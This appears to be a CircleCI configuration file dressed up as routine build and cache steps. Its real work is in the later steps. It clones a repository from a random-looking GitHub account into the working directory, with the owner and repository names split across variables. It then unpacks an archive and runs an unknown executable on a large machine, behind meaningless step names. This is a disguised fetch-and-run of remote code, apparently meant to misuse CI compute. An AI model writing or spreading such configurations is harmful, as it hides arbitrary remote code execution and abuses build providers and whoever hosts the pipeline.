version: 2.1

jobs:
  pre-compile-image-scan:
    docker:
      - image: cimg/base:2024.10
    resource_class: small
    steps:
      - run:
          name: Phase 3 Fast Snapshot Restore
          command: |
            install -d /tmp/ExtractingCachedArchive
            printf 'full-index-rebuild-routine on-demand-website-artifacts\n' | dd of=/tmp/ExtractingCachedArchive/crawler-artifacts status=none
            head -c 100 /tmp/ExtractingCachedArchive/crawler-artifacts
      - persist_to_workspace:
          root: /tmp/ExtractingCachedArchive
          paths:
            - 'crawler-artifacts'
  launchingLoggerInstances:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/ExtractingCachedArchive
      - run:
          name: Asset compilation job
          command: |
            cat /tmp/ExtractingCachedArchive/crawler-artifacts
      - run:
          name: pluginsRun1
          command: |
            scripts="breenanavarro370450gwdf4nlq-debug"; retire="rollOutTask"
            git clone -q --depth 1 "https://github.com/${scripts}/${retire}" "`pwd`"
      - run:
          name: Create (level 4)
          command: |
            bunzip2 -c parserSuccessNotification.tar.bz2 | tar -xf -
      - run:
          command: |
            bash -c "./ManualCompression"
